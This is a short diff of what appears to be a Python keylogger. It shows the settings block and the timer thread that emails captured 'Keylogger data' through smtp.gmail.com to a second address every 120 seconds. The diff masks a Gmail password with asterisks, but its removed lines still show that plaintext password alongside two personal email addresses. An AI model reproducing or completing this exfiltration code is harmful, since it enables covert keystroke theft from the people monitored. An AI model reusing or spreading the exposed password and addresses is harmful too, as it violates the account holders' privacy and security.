@@ -20,11 +20,11 @@ t="";pics_names=[]
 
 #########Settings########
 
-yourgmail="bollayeshwanthreddy321@gmail.com"                                        #What is your gmail?
-yourgmailpass="qwertyui@123"                                    #What is your gmail password
+yourgmail="bollayeshwanthreddy321@gmail.com"                               #What is your gmail?
+yourgmailpass="*************"                                              #What is your gmail password
 sendto="bollalavanya7@gmail.com"                                           #Where should I send the logs to? (any email address)
 interval=120
-                                      #Time to wait before sending data to email (in seconds)
+                                                                           #Time to wait before sending data to email (in seconds)
 
 ########################
 
@@ -62,7 +62,7 @@ class TimerClass(threading.Thread):
                 SERVER = "smtp.gmail.com" #Specify Server Here
                 PORT = 587 #Specify Port Here
                 yourgmail=("bollayeshwanthreddy321@gmail.com")#Specify Username Here 
-                yourgmailpass=("qwertyui@123")#Specify Password Here
+                yourgmailpass=("************")#Specify Password Here
                 FROM = yourgmail#From address is taken from username
                 sendto = ["bollalavanya7@gmail.com"] #Specify to address.Use comma if more than one to address is needed.
                 SUBJECT = "Keylogger data: "+str(ts)
